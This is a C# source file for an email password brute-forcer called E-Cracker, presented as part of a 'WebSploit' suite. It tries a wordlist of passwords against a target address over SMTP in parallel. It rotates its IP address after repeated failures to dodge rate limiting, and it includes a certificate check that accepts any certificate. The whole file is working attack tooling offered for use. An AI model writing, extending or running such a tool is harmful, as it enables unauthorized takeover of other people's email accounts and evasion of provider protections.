using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;

namespace EmailCracker
{
    class MainAttacker
    {
        static int temp_counter = 0;
        public static void AttemptLogin(string smtp, int smtp_port, string target, string[] passwords, bool verbose, bool ssl)
        {
            SetupAttackEnv(target, smtp);
            try
            {
                Parallel.ForEach(passwords, pass => {
                    if(temp_counter >= 5 && !IsLinux){
                        IPChanger.ChangeIP(verbose);
                        temp_counter = 0;
                    }
                    pass = pass.Trim();
                    SmtpClient client = new SmtpClient(smtp, smtp_port);
                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress(target);
                    mail.To.Add(target);
                    mail.IsBodyHtml = true;
                    mail.Subject = "Subject";
                    mail.Body = $"Body";

                    client.UseDefaultCredentials = false;
                    client.Credentials = new NetworkCredential(target, pass);
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
                    if(ssl)
                        client.EnableSsl = true;
                    //client.Timeout = 30000;

                    if(client.Credentials != null)
                    {
                        try
                        {
                            client.Send(mail);
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] Password successfully found: {pass}.");
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("[VERBOSE] : Finishing child elements before returning...");
                            Environment.Exit(1);
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                        catch(SmtpException ex)
                        {
                            temp_counter++;
                            Console.WriteLine($"[ATTEMPT] Invalid password: {pass}.");
                            if(verbose)
                            {
                                Console.WriteLine("[VERBOSE] : SMTP Authentification mechanism attempt");
                                Console.WriteLine($"[VERBOSE] : {ex.Message}");
                            }
                        }
                    }
                    else
                    {
                        Console.Write("[ERROR] : Credentials are null.");
                    }
                });
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[INFO] : Password not found in wordlist!");
                Console.WriteLine("[INFO] : E-Cracker is closing...\n");
                Console.ForegroundColor = ConsoleColor.White;
            }
            catch(OperationCanceledException)
            {
                Console.WriteLine("Cancalation token sent request...");
                return;
            }
        }
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; 
        }

        public static bool IsLinux
        {
            get
            {
                int p = (int) Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }
        static void SetupAttackEnv(string target, string smtp)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(Figgle.FiggleFonts.RedPhoenix.Render("E-Cracker"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Cracker v1.2.1 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Target email address : {target}");
            Console.WriteLine($"Target smtp address : {smtp}");
            Console.WriteLine("[WARNING] : Google and others have implemented bruteforce protection. Try with small wordlist first.");
            Console.WriteLine("[INFO] : Begin bruteforce attack...\n");
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(150);
        }
    }
}